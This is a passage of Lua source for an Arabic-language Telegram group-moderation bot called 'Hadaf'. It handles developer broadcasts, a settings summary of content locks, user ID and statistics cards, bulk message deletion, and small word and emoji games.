redis:setex(bot_id.."Hadaf:Broadcasting:Users" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"🔘┇ارسل لي المنشور الان\n⚠️️┇يمكنك ارسال -{ صوره - ملصق - متحركه - رساله }\n⚠️┇لالغاء الاذاعه ارسل : الغاء") 
return false
elseif text=="اذاعه" and msg.reply_to_message_id_ == 0 and DeveloperBot(msg) then 
if redis:get(bot_id.."Hadaf:Broadcasting:Bot") and not Dev_Hadaf(msg) then 
send(msg.chat_id_, msg.id_,"✅┇تم تعطيل الاذاعه من قبل المطور الاساسي !")
return false end
redis:setex(bot_id.."Hadaf:Broadcasting:Groups" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"🔘┇ارسل لي المنشور الان\n⚠️️┇يمكنك ارسال -{ صوره - ملصق - متحركه - رساله }\n⚠️┇لالغاء الاذاعه ارسل : الغاء") 
return false
elseif text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and DeveloperBot(msg) then 
if redis:get(bot_id.."Hadaf:Broadcasting:Bot") and not Dev_Hadaf(msg) then 
send(msg.chat_id_, msg.id_,"✅┇تم تعطيل الاذاعه من قبل المطور الاساسي !")
return false end
redis:setex(bot_id.."Hadaf:Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"🔘┇ارسل لي المنشور الان\n⚠️️┇يمكنك ارسال -{ صوره - ملصق - متحركه - رساله }\n⚠️┇لالغاء الاذاعه ارسل : الغاء") 
return false
elseif text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and DeveloperBot(msg) then 
if redis:get(bot_id.."Hadaf:Broadcasting:Bot") and not Dev_Hadaf(msg) then 
send(msg.chat_id_, msg.id_,"✅┇تم تعطيل الاذاعه من قبل المطور الاساسي !")
return false end
redis:setex(bot_id.."Hadaf:Broadcasting:Groups:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⚠️️┇ارسل لي التوجيه الان\n✅┇ليتم نشره في المجموعات") 
return false
elseif text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  and DeveloperBot(msg) then 
if redis:get(bot_id.."Hadaf:Broadcasting:Bot") and not Dev_Hadaf(msg) then 
send(msg.chat_id_, msg.id_,"✅┇تم تعطيل الاذاعه من قبل المطور الاساسي !")
return false end
redis:setex(bot_id.."Hadaf:Broadcasting:Users:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⚠️️┇ارسل لي التوجيه الان\n✅┇ليتم نشره الى المشتركين") 
return false

elseif text == "الاعدادات" and Admin(msg) then    
if redis:get(bot_id.."Hadaf:lockpin"..msg.chat_id_) then    
lock_pin = "{✔️}"
else 
lock_pin = "{✖}"    
end
if redis:get(bot_id.."Hadaf:Lock:tagservr"..msg.chat_id_) then    
lock_tagservr = "{✔️}"
else 
lock_tagservr = "{✖}"
end
if redis:get(bot_id.."Hadaf:Lock:text"..msg.chat_id_) then    
lock_text = "← {✔️}"
else 
lock_text = "← {✖}"    
end
if redis:get(bot_id.."Hadaf:Lock:AddMempar"..msg.chat_id_) == "kick" then
lock_add = "← {✔️}"
else 
lock_add = "← {✖}"    
end    
if redis:get(bot_id.."Hadaf:Lock:Join"..msg.chat_id_) == "kick" then
lock_join = "← {✔️}"
else 
lock_join = "← {✖}"    
end    
if redis:get(bot_id.."Hadaf:Lock:edit"..msg.chat_id_) then    
lock_edit = "← {✔️}"
else 
lock_edit = "← {✖}"    
end
if redis:get(bot_id.."Hadaf:Chek:Welcome"..msg.chat_id_) then
welcome = "← {✔️}"
else 
welcome = "← {✖}"    
end
if redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "← { بالطرد }"     
elseif redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "← { بالتقييد }"     
elseif redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "← { بالكتم }"           
elseif redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "← {✔️}"
else     
flood = "← {✖}"     
end
if redis:get(bot_id.."Hadaf:Lock:Photo"..msg.chat_id_) == "del" then
lock_photo = "← {✔️}" 
elseif redis:get(bot_id.."Hadaf:Lock:Photo"..msg.chat_id_) == "ked" then 
lock_photo = "← { بالتقييد }"   
elseif redis:get(bot_id.."Hadaf:Lock:Photo"..msg.chat_id_) == "ktm" then 
lock_photo = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:Photo"..msg.chat_id_) == "kick" then 
lock_photo = "← { بالطرد }"   
else
lock_photo = "← {✖}"   
end    
if redis:get(bot_id.."Hadaf:Lock:Contact"..msg.chat_id_) == "del" then
lock_phon = "← {✔️}" 
elseif redis:get(bot_id.."Hadaf:Lock:Contact"..msg.chat_id_) == "ked" then 
lock_phon = "← { بالتقييد }"    
elseif redis:get(bot_id.."Hadaf:Lock:Contact"..msg.chat_id_) == "ktm" then 
lock_phon = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:Contact"..msg.chat_id_) == "kick" then 
lock_phon = "← { بالطرد }"    
else
lock_phon = "← {✖}"    
end    
if redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) == "del" then
lock_links = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) == "ked" then
lock_links = "← { بالتقييد }"    
elseif redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) == "ktm" then
lock_links = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) == "kick" then
lock_links = "← { بالطرد }"    
else
lock_links = "← {✖}"    
end
if redis:get(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_) == "del" then
lock_cmds = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_) == "ked" then
lock_cmds = "← { بالتقييد }"    
elseif redis:get(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_) == "ktm" then
lock_cmds = "← { بالكتم }"   
elseif redis:get(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_) == "kick" then
lock_cmds = "← { بالطرد }"    
else
lock_cmds = "← {✖}"    
end
if redis:get(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_) == "del" then
lock_user = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_) == "ked" then
lock_user = "← { بالتقييد }"    
elseif redis:get(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_) == "ktm" then
lock_user = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_) == "kick" then
lock_user = "← { بالطرد }"    
else
lock_user = "← {✖}"    
end
if redis:get(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_) == "del" then
lock_hash = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_) == "ked" then 
lock_hash = "← { بالتقييد }"    
elseif redis:get(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_) == "ktm" then 
lock_hash = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_) == "kick" then 
lock_hash = "← { بالطرد }"    
else
lock_hash = "← {✖}"    
end
if redis:get(bot_id.."Hadaf:Lock:vico"..msg.chat_id_) == "del" then
lock_muse = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:vico"..msg.chat_id_) == "ked" then 
lock_muse = "← { بالتقييد }"    
elseif redis:get(bot_id.."Hadaf:Lock:vico"..msg.chat_id_) == "ktm" then 
lock_muse = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:vico"..msg.chat_id_) == "kick" then 
lock_muse = "← { بالطرد }"    
else
lock_muse = "← {✖}"    
end 
if redis:get(bot_id.."Hadaf:Lock:Video"..msg.chat_id_) == "del" then
lock_ved = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:Video"..msg.chat_id_) == "ked" then 
lock_ved = "← { بالتقييد }"    
elseif redis:get(bot_id.."Hadaf:Lock:Video"..msg.chat_id_) == "ktm" then 
lock_ved = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:Video"..msg.chat_id_) == "kick" then 
lock_ved = "← { بالطرد }"    
else
lock_ved = "← {✖}"    
end
if redis:get(bot_id.."Hadaf:Lock:Animation"..msg.chat_id_) == "del" then
lock_gif = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:Animation"..msg.chat_id_) == "ked" then 
lock_gif = "← { بالتقييد }"    
elseif redis:get(bot_id.."Hadaf:Lock:Animation"..msg.chat_id_) == "ktm" then 
lock_gif = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:Animation"..msg.chat_id_) == "kick" then 
lock_gif = "← { بالطرد }"    
else
lock_gif = "← {✖}"    
end
if redis:get(bot_id.."Hadaf:Lock:Sticker"..msg.chat_id_) == "del" then
lock_ste = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:Sticker"..msg.chat_id_) == "ked" then 
lock_ste = "بالتقييد "    
elseif redis:get(bot_id.."Hadaf:Lock:Sticker"..msg.chat_id_) == "ktm" then 
lock_ste = "بالكتم "    
elseif redis:get(bot_id.."Hadaf:Lock:Sticker"..msg.chat_id_) == "kick" then 
lock_ste = "← { بالطرد }"    
else
lock_ste = "← {✖}"    
end
if redis:get(bot_id.."Hadaf:Lock:geam"..msg.chat_id_) == "del" then
lock_geam = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:geam"..msg.chat_id_) == "ked" then 
lock_geam = "← { بالتقييد }"    
elseif redis:get(bot_id.."Hadaf:Lock:geam"..msg.chat_id_) == "ktm" then 
lock_geam = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:geam"..msg.chat_id_) == "kick" then 
lock_geam = "← { بالطرد }"    
else
lock_geam = "← {✖}"    
end    
if redis:get(bot_id.."Hadaf:Lock:vico"..msg.chat_id_) == "del" then
lock_vico = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:vico"..msg.chat_id_) == "ked" then 
lock_vico = "← { بالتقييد }"    
elseif redis:get(bot_id.."Hadaf:Lock:vico"..msg.chat_id_) == "ktm" then 
lock_vico = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:vico"..msg.chat_id_) == "kick" then 
lock_vico = "← { بالطرد }"    
else
lock_vico = "← {✖}"    
end    
if redis:get(bot_id.."Hadaf:Lock:Keyboard"..msg.chat_id_) == "del" then
lock_inlin = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:Keyboard"..msg.chat_id_) == "ked" then 
lock_inlin = "← { بالتقييد }"
elseif redis:get(bot_id.."Hadaf:Lock:Keyboard"..msg.chat_id_) == "ktm" then 
lock_inlin = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:Keyboard"..msg.chat_id_) == "kick" then 
lock_inlin = "← { بالطرد }"
else
lock_inlin = "← {✖}"
end
if redis:get(bot_id.."Hadaf:Lock:forward"..msg.chat_id_) == "del" then
lock_fwd = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:forward"..msg.chat_id_) == "ked" then 
lock_fwd = "← { بالتقييد }"    
elseif redis:get(bot_id.."Hadaf:Lock:forward"..msg.chat_id_) == "ktm" then 
lock_fwd = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:forward"..msg.chat_id_) == "kick" then 
lock_fwd = "← { بالطرد }"    
else
lock_fwd = "← {✖}"    
end    
if redis:get(bot_id.."Hadaf:Lock:Document"..msg.chat_id_) == "del" then
lock_file = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:Document"..msg.chat_id_) == "ked" then 
lock_file = "← { بالتقييد }"    
elseif redis:get(bot_id.."Hadaf:Lock:Document"..msg.chat_id_) == "ktm" then 
lock_file = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:Document"..msg.chat_id_) == "kick" then 
lock_file = "← { بالطرد }"    
else
lock_file = "← {✖}"    
end    
if redis:get(bot_id.."Hadaf:Lock:Unsupported"..msg.chat_id_) == "del" then
lock_self = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:Unsupported"..msg.chat_id_) == "ked" then 
lock_self = "← { بالتقييد }"    
elseif redis:get(bot_id.."Hadaf:Lock:Unsupported"..msg.chat_id_) == "ktm" then 
lock_self = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:Unsupported"..msg.chat_id_) == "kick" then 
lock_self = "← { بالطرد }"    
else
lock_self = "← {✖}"    
end
if redis:get(bot_id.."Hadaf:Lock:Bot:kick"..msg.chat_id_) == "del" then
lock_bots = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:Bot:kick"..msg.chat_id_) == "ked" then
lock_bots = "← { بالتقييد }"   
elseif redis:get(bot_id.."Hadaf:Lock:Bot:kick"..msg.chat_id_) == "kick" then
lock_bots = "← { بالطرد }"    
else
lock_bots = "← {✖}"    
end
if redis:get(bot_id.."Hadaf:Lock:Markdaun"..msg.chat_id_) == "del" then
lock_mark = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:Markdaun"..msg.chat_id_) == "ked" then 
lock_mark = "← { بالتقييد }"    
elseif redis:get(bot_id.."Hadaf:Lock:Markdaun"..msg.chat_id_) == "ktm" then 
lock_mark = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:Markdaun"..msg.chat_id_) == "kick" then 
lock_mark = "← { بالطرد }"    
else
lock_mark = "← {✖}"    
end
if redis:get(bot_id.."Hadaf:Lock:Spam"..msg.chat_id_) == "del" then    
lock_spam = "← {✔️}"
elseif redis:get(bot_id.."Hadaf:Lock:Spam"..msg.chat_id_) == "ked" then 
lock_spam = "← { بالتقييد }"    
elseif redis:get(bot_id.."Hadaf:Lock:Spam"..msg.chat_id_) == "ktm" then 
lock_spam = "← { بالكتم }"    
elseif redis:get(bot_id.."Hadaf:Lock:Spam"..msg.chat_id_) == "kick" then 
lock_spam = "← { بالطرد }"    
else
lock_spam = "← {✖}"    
end        
if not redis:get(bot_id.."Hadaf:Reply:Manager"..msg.chat_id_) then
ReplyManager = "← {✔️}"
else
ReplyManager = "← {✖}"
end
if not redis:get(bot_id.."Hadaf:Reply:Sudo"..msg.chat_id_) then
ReplySudo = "← {✔️}"
else
ReplySudo = "← {✖}"
end
if not redis:get(bot_id.."Hadaf:Lock:Id:Photo"..msg.chat_id_)  then
IdPhoto = "← {✔️}"
else
IdPhoto = "← {✖}"
end
if not redis:get(bot_id.."Hadaf:Lock:Id:Py:Photo"..msg.chat_id_) then
IdPyPhoto = "← {✔️}"
else
IdPyPhoto = "← {✖}"
end
if not redis:get(bot_id.."Hadaf:Cheking:Kick:Me:Group"..msg.chat_id_)  then
KickMe = "← {✔️}"
else
KickMe = "← {✖}"
end
if not redis:get(bot_id.."Hadaf:Lock:Ban:Group"..msg.chat_id_)  then
Banusers = "← {✔️}"
else
Banusers = "← {✖}"
end
if not redis:get(bot_id.."Hadaf:Cheking:Seted"..msg.chat_id_) then
Setusers = "← {✔️}"
else
Setusers = "← {✖}"
end
if redis:get(bot_id.."Hadaf:Link_Group"..msg.chat_id_) then
Link_Group = "← {✔️}"
else
Link_Group = "← {✖}"
end
if not redis:get(bot_id.."Hadaf:Fun:Group"..msg.chat_id_) then
FunGroup = "← {✔️}"
else
FunGroup = "← {✖}"
end
local Num_Flood = redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 0
send(msg.chat_id_, msg.id_,"*\n🔖┇اعدادات المجموعه "..
"\n━━━━━━━━━━━━━"..
"\n🔏┇علامة ال (✔️) تعني مفعل"..
"\n🔓┇علامة ال (✖) تعني معطل"..
"\n━━━━━━━━━━━━━"..
"\n📌┇الروابط "..lock_links..
"\n".."📌┇الكلايش "..lock_spam..
"\n".."📌┇الكيبورد "..lock_inlin..
"\n".."📌┇الصوت "..lock_vico..
"\n".."📌┇المتحركه "..lock_gif..
"\n".."📌┇الملفات "..lock_file..
"\n".."📌┇المحادثه "..lock_text..
"\n".."📌┇الفيديو "..lock_ved..
"\n".."📌┇الصور "..lock_photo..
"\n━━━━━━━━━━━━━"..
"\n".."⚠️️┇المعرفات  "..lock_user..
"\n".."⚠️️┇النداء "..lock_hash..
"\n".."⚠️️┇البوتات "..lock_bots..
"\n".."⚠️️┇التوجيه "..lock_fwd..
"\n".."⚠️️┇الصوت "..lock_muse..
"\n".."⚠️️┇الملصقات "..lock_ste..
"\n".."⚠️️┇الجهات "..lock_phon..
"\n".."⚠️️┇الدخول "..lock_join..
"\n".."⚠️️┇الاضافه "..lock_add..
"\n".."⚠️️┇السيلفي "..lock_self..
"\n━━━━━━━━━━━━━"..
"\n".."🔰┇التثبيت "..lock_pin..
"\n".."🔰┇الاشعارات "..lock_tagservr..
"\n".."🔰┇الماركدون "..lock_mark..
"\n".."🔰┇التعديل "..lock_edit..
"\n".."🔰┇الالعاب "..lock_geam..
"\n".."🔰┇التكرار "..flood..
"\n━━━━━━━━━━━━━"..
"\n".."💢┇الترحيب "..welcome..
"\n".."💢┇الرفع "..Setusers..
"\n".."💢┇الطرد "..Banusers..
"\n".."💢┇الايدي "..IdPhoto..
"\n".."💢┇الايدي بالصوره "..IdPyPhoto..
"\n".."💢┇اطردني "..KickMe..
"\n".."💢┇الردود "..ReplyManager..
"\n".."💢┇ردود العام "..ReplySudo..
"\n".."💢┇جلب الرابط "..Link_Group..
"\n".."💢┇عدد التكرار ← {"..Num_Flood.."}\n\n.*")     
elseif text == 'تعيين الايدي' and Owner(msg) then
redis:setex(bot_id.."Hadaf:Redis:Id:Group"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
lsend(msg.chat_id_, msg.id_,[[
📝┇ارسل الان النص
🔘┇يمكنك اضافه :
👤┇`#username` » اسم المستخدم
📨┇`#msgs` » عدد الرسائل
🌄┇`#photos` » عدد الصور
🚸┇`#id` » ايدي المستخدم
📈┇`#auto` » نسبة التفاعل
🙋┇`#stast` » رتبة المستخدم 
📝┇`#edit` » عدد التعديلات
💎┇`#game` » عدد النقاط
📱┇`#AddMem` » عدد الجهات
📋┇`#Description` » تعليق الصوره
]])
return false  
end 
if text == 'ايدي' and tonumber(msg.reply_to_message_id_) == 0 and not redis:get(bot_id..'Hadaf:Lock:Id:Photo'..msg.chat_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,taha,success) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'لا يوجد'
end
local Id = msg.sender_user_id_
local NumMsg = redis:get(bot_id..'Hadaf:Num:Message:User'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(Id,msg.chat_id_)
local NumMessageEdit = redis:get(bot_id..'Hadaf:Num:Message:Edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Num_Games = redis:get(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_) or 0
local Add_Mem = redis:get(bot_id.."Hadaf:Num:Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) or 0
local Total_Photp = (taha.total_count_ or 0)
local Texting = {
'اللهم زد جماله',
"الله يحفظك",
"اطلق صوره🐼❤️",
}
local Description = Texting[math.random(#Texting)]
local Get_Is_Id = redis:get(bot_id.."Hadaf:Set:Id:Group"..msg.chat_id_)
if not redis:get(bot_id..'Hadaf:Lock:Id:Py:Photo'..msg.chat_id_) then
if taha.photos_[0] then
if Get_Is_Id then
local Get_Is_Id = Get_Is_Id:gsub('#AddMem',Add_Mem) 
local Get_Is_Id = Get_Is_Id:gsub('#id',Id) 
local Get_Is_Id = Get_Is_Id:gsub('#username',UserName_User) 
local Get_Is_Id = Get_Is_Id:gsub('#msgs',NumMsg) 
local Get_Is_Id = Get_Is_Id:gsub('#edit',NumMessageEdit) 
local Get_Is_Id = Get_Is_Id:gsub('#stast',Status_Gps) 
local Get_Is_Id = Get_Is_Id:gsub('#auto',TotalMsg) 
local Get_Is_Id = Get_Is_Id:gsub('#Description',Description) 
local Get_Is_Id = Get_Is_Id:gsub('#game',Num_Games) 
local Get_Is_Id = Get_Is_Id:gsub('#photos',Total_Photp) 
sendPhoto(msg.chat_id_,msg.id_,taha.photos_[0].sizes_[1].photo_.persistent_id_,Get_Is_Id)
else
sendPhoto(msg.chat_id_,msg.id_,taha.photos_[0].sizes_[1].photo_.persistent_id_,'🌇┇'..Description..'\n⚠️️┇ايديك ← '..Id..'\n👤┇معرفك ← '..UserName_User..'\n🚸┇رتبتك ← '..Status_Gps..'\n📧┇رسائلك ← '..NumMsg..'\n📝┇التعديلات ← '..NumMessageEdit..' \n📊┇تتفاعلك ← '..TotalMsg..'\n💎┇ نقاطك ← '..Num_Games)
end
else
send(msg.chat_id_, msg.id_,'\n*⚠️️┇ايديك ← '..Id..'\n👤┇معرفك ← *['..UserName_User..']*\n🚸┇رتبتك ← '..Status_Gps..'\n📧┇رسائلك ← '..NumMsg..'\n📝┇التعديلات ← '..NumMessageEdit..' \n📊┇تتفاعلك ← '..TotalMsg..'\n💎┇ نقاطك ← '..Num_Games..'*') 
end
else
if Get_Is_Id then
local Get_Is_Id = Get_Is_Id:gsub('#AddMem',Add_Mem) 
local Get_Is_Id = Get_Is_Id:gsub('#id',Id) 
local Get_Is_Id = Get_Is_Id:gsub('#username',UserName_User) 
local Get_Is_Id = Get_Is_Id:gsub('#msgs',NumMsg) 
local Get_Is_Id = Get_Is_Id:gsub('#edit',NumMessageEdit) 
local Get_Is_Id = Get_Is_Id:gsub('#stast',Status_Gps) 
local Get_Is_Id = Get_Is_Id:gsub('#auto',TotalMsg) 
local Get_Is_Id = Get_Is_Id:gsub('#Description',Description) 
local Get_Is_Id = Get_Is_Id:gsub('#game',Num_Games) 
local Get_Is_Id = Get_Is_Id:gsub('#photos',Total_Photp) 
send(msg.chat_id_, msg.id_,'['..Get_Is_Id..']') 
else
send(msg.chat_id_, msg.id_,'\n*⚠️️┇ايديك ← '..Id..'\n👤┇معرفك ← *['..UserName_User..']*\n🚸┇رتبتك ← '..Status_Gps..'\n📧┇رسائلك ← '..NumMsg..'\n📝┇التعديلات ← '..NumMessageEdit..' \n📊┇تتفاعلك ← '..TotalMsg..'\n💎┇ نقاطك ← '..Num_Games..'*') 
end
end
end,nil)   
end,nil)   
end
if text and text:match('^تنظيف (%d+)$') and Admin(msg) or text and text:match('^حذف (%d+)$') and Admin(msg) or text and text:match('^مسح (%d+)$') and Admin(msg) then    
local Msg_Num = tonumber(text:match('^تنظيف (%d+)$')) or tonumber(text:match('^حذف (%d+)$'))  or tonumber(text:match('^مسح (%d+)$')) 
if Msg_Num > 1000 then 
send(msg.chat_id_, msg.id_,'⚠️┇تستطيع حذف *(1000)* رساله فقط') 
return false  
end  
local Message = msg.id_
for i=1,tonumber(Msg_Num) do
Delete_Message(msg.chat_id_,{[0]=Message})
Message = Message - 1048576
end
send(msg.chat_id_, msg.id_,'✅┇تم ازالة *- '..Msg_Num..'* رساله من المجموعه')  
elseif text == 'كشف' and tonumber(msg.reply_to_message_id_) > 0 and not redis:get(bot_id..'Hadaf:Lock:Id:Photo'..msg.chat_id_) then
function Function_Status(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.first_name_ == false then
send(msg.chat_id_, msg.id_,'⚠️┇ الحساب محذوف لا توجد معلوماته ')
return false
end
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'لا يوجد'
end
local Id = data.id_
local NumMsg = redis:get(bot_id..'Hadaf:Num:Message:User'..msg.chat_id_..':'..data.id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(Id,msg.chat_id_)
local NumMessageEdit = redis:get(bot_id..'Hadaf:Num:Message:Edit'..msg.chat_id_..data.id_) or 0
local Num_Games = redis:get(bot_id.."Hadaf:Msg_User"..msg.chat_id_..":"..data.id_) or 0
local Add_Mem = redis:get(bot_id.."Hadaf:Num:Add:Memp"..msg.chat_id_..":"..data.id_) or 0
send(msg.chat_id_, msg.id_,'\n*⚠️️┇ايديه ← '..Id..'\n📧┇رسائله ← '..NumMsg..'\n👤┇معرفه ← *['..UserName_User..']*\n🚸┇رتبته ← '..Status_Gps..'\n📝┇تعديلاته ← '..NumMessageEdit..'\n👥┇جهاته ← '..Add_Mem..'*') 
end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Status, nil)
return false
elseif text and text:match("^كشف @(.*)$") and not redis:get(bot_id..'Hadaf:Lock:Id:Photo'..msg.chat_id_) then
local username = text:match("^كشف @(.*)$")
function Function_Status(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'لا يوجد'
end
local Id = data.id_
local NumMsg = redis:get(bot_id..'Hadaf:Num:Message:User'..msg.chat_id_..':'..data.id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(Id,msg.chat_id_)
local NumMessageEdit = redis:get(bot_id..'Hadaf:Num:Message:Edit'..msg.chat_id_..data.id_) or 0
local Num_Games = redis:get(bot_id.."Hadaf:Msg_User"..msg.chat_id_..":"..data.id_) or 0
local Add_Mem = redis:get(bot_id.."Hadaf:Num:Add:Memp"..msg.chat_id_..":"..data.id_) or 0
send(msg.chat_id_, msg.id_,'\n*⚠️️┇ايديه ← '..Id..'\n📧┇رسائله ← '..NumMsg..'\n👤┇معرفه ← *['..UserName_User..']*\n🚸┇رتبته ← '..Status_Gps..'\n📝┇تعديلاته ← '..NumMessageEdit..'\n👥┇جهاته ← '..Add_Mem..'*') 
end,nil)   
else
send(msg.chat_id_, msg.id_,'⚠️┇لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Status, nil)
return false
elseif text == "سمايلات" or text == "سمايل" then
if redis:get(bot_id.."Hadaf:Lock:Game:Group"..msg.chat_id_) then
redis:del(bot_id.."Hadaf:Set:Sma"..msg.chat_id_)
Random = {"🍏","🍎","🍐","🍊","🍋","🍉","🍇","🍓","🍈","🍒","🍑","🍍","🥥","🥝","🍅","🍆","🥑","🥦","🥒","🌶","🌽","🥕","🥔","🥖","🥐","🍞","🥨","🍟","🧀","🥚","🍳","🥓","🥩","🍗","🍖","🌭","🍔","🍠","🍕","🥪","🥙","☕️","??","🥤","🍶","🍺","🍻","🏀","⚽️","🏈","⚾️","🎾","🏐","🏉","🎱","🏓","🏸","🥅","🎰","🎮","🎳","🎯","🎲","🎻","🎸","🎺","🥁","🎹","🎼","🎧","🎤","🎬","🎨","🎭","🎪","🎟","🎫","🎗","🏵","🎖","🏆","🥌","🛷","🚗","🚌","🏎","🚓","🚑","🚚","🚛","🚜","🇮🇶","⚔","🛡","🔮","🌡","💣","📌","📍","📓","📗","📂","📅","📪","📫","📬","📭","⏰","📺","🎚","☎️","📡"}
SM = Random[math.random(#Random)]
redis:set(bot_id.."Hadaf:Random:Sm"..msg.chat_id_,SM)
send(msg.chat_id_, msg.id_,"🔰┇اسرع واحد يرسل هذا السمايل ? ~ {`"..SM.."`}")
return false
end
elseif text == "الاسرع" or tect == "ترتيب" then
if redis:get(bot_id.."Hadaf:Lock:Game:Group"..msg.chat_id_) then
redis:del(bot_id.."Hadaf:Speed:Tr"..msg.chat_id_)
KlamSpeed = {"سحور","سياره","استقبال","ايفون","مطبخ","كرستيانو","دجاجه","مدرسه","الوان","غرفه","ثلاجه","قهوه","سفينه","العراق","محطه","طياره","رادار","منزل","مستشفى","كهرباء","تفاحه","اخطبوط","سلمون","فرنسا","برتقاله","تفاح","مطرقه","شباك","باص","سمكه","ذباب","تلفاز","حاسوب","انترنت","ساحه","جسر"};
name = KlamSpeed[math.random(#KlamSpeed)]
redis:set(bot_id.."Hadaf:Klam:Speed"..msg.chat_id_,name)
name = string.gsub(name,"سحور","س ر و ح")
name = string.gsub(name,"سياره","ه ر س ي ا")
name = string.gsub(name,"استقبال","ل ب ا ت ق س ا")
name = string.gsub(name,"ايفون","و ن ف ا")
name = string.gsub(name,"مطبخ","خ ب ط م")
name = string.gsub(name,"كرستيانو","س ت ا ن و ك ر ي")
name = string.gsub(name,"دجاجه","ج ج ا د ه")
name = string.gsub(name,"مدرسه","ه م د ر س")
name = string.gsub(name,"الوان","ن ا و ا ل")
name = string.gsub(name,"غرفه","غ ه ر ف")
name = string.gsub(name,"ثلاجه","ج ه ت ل ا")
name = string.gsub(name,"قهوه","ه ق ه و")
name = string.gsub(name,"سفينه","ه ن ف ي س")
name = string.gsub(name,"العراق","ق ع ا ل ر ا")
name = string.gsub(name,"محطه","ه ط م ح")
name = string.gsub(name,"طياره","ر ا ط ي ه")
name = string.gsub(name,"رادار","ر ا ر ا د")
name = string.gsub(name,"منزل","ن ز م ل")
name = string.gsub(name,"مستشفى","ى ش س ف ت م")
name = string.gsub(name,"كهرباء","ر ب ك ه ا ء")
name = string.gsub(name,"تفاحه","ح ه ا ت ف")
